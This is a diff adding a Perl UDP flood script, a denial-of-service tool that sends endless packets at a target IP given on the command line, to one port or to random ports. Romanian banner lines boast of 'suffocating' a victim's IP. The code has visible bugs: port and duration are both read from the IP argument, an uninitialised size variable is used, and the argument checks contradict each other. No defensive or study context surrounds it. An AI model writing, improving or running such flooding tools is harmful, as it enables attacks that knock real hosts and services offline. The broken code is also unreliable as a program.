@@ -1,0 +1,55 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+if ($ARGC !=1) {
+printf "^[[0;31m* ^[[0;32m#> Idiotule comanda este perl  ^[[0;31m $0 <ip> ^[[0;31m*^[[0m\n";
+exit(1);
+}
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[0;31m##############################################################\n";
+printf "[0;31m                      
+                 ## ##   ## ##             ####  
+                 ##   ## ##   ##   ###    ##  ##
+                 ##   ## ##   ## ##   ##   ##    
+                 ##  ##  ##  ##  ##   ## ##  ##     
+                 ####    ####      ###    ####     
+                                                  \n";
+printf "[0;32m# Pfoaaa....a picat sclavu la enter... #\n";
+printf "[0;32m# Stiti cum se zice,caini latra DDoS floodeaza #\n";
+printf "[0;32m# Sclavu' nu mai respira.I-am sufocat ip-ul. #\n";
+printf "[0;32m#      Arhiva de flood by DDoS HacKing    #\n";
+printf "[0;31m#############################################################\n";
+printf "[0;32m# Ca sa ii dai aer ip-ului apasa simultan [CTRL+C].    #\n";
+printf "[0;31m##########################################################\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 8, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 99500) +0;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
